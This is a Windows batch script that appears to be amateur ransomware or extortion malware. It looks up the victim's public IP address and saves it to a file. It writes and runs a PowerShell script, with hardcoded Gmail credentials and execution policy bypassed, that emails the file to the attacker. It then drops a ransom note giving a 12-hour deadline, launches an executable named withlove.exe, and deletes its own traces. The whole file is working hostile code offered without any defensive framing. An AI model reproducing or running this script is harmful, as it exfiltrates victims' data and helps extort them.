@echo off
>"%temp%\ip.vbs" echo Set objHTTP = CreateObject("MSXML2.XMLHTTP")
>>"%temp%\ip.vbs" echo Call objHTTP.Open("GET", "http://checkip.dyndns.org", False)
>>"%temp%\ip.vbs" echo objHTTP.Send()
>>"%temp%\ip.vbs" echo strHTML = objHTTP.ResponseText
>>"%temp%\ip.vbs" echo wscript.echo strHTML

for /f "tokens=7 delims=:<" %%a in ('cscript /nologo "%temp%\ip.vbs"') do set ip=%%a
echo %ip:~1% >> C:\EXInew.txt
@echo off 
for /r "c:\" %%x in (email*.ps1) do move "%%x" "c:\" 

>> C:\Emailattach.ps1 (
Echo $smtpClient = new-object system.net.mail.smtpClient 
Echo $smtpClient.Host = 'smtp.gmail.com'
Echo $smtpClient.Port = 587
Echo $smtpClient.EnableSsl = $true
Echo $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("usernameishidden34@gmail.com", "hidden123!");
)
>> C:\Emailattach.ps1 (
Echo $emailfrom = "usernameishidden34@gmail.com"
Echo $emailto = "usernameishidden34@gmail.com"
Echo $subject = "ADD"
Echo $body = "a body of LIES!"
Echo $emailMessage = New-Object System.Net.Mail.MailMessage
)
>> C:\Emailattach.ps1 (
Echo $emailMessage.From = $EmailFrom
Echo $emailMessage.To.Add($EmailTo)
)
>> C:\Emailattach.ps1 (
Echo $emailMessage.Subject = $Subject
Echo $emailMessage.Body = $Body
Echo $emailMessage.Attachments.Add("C:\EXInew.txt")
)
>> C:\Emailattach.ps1 (
Echo $SMTPClient.Send($emailMessage)
)

PowerShell.exe -NoProfile -ExecutionPolicy Bypass C:\Emailattach.ps1 
cd\
c:\
>> IfYouWantYourFilesBack.txt echo:Email this address usernameishidden34@gmail.com if you want to know how to get your files back safe if you do not follow the instructions then you will never see your files again... you have 12 hours. 
start IfYouWantYourFilesBack.txt
for /r "c:\" %%x in (withlove*.exe) do move "%%x" "c:\"
cd\
c:\
start withlove.exe
del Emailattach.ps1
del withlove.exe
del CourtOrder.exe

pause
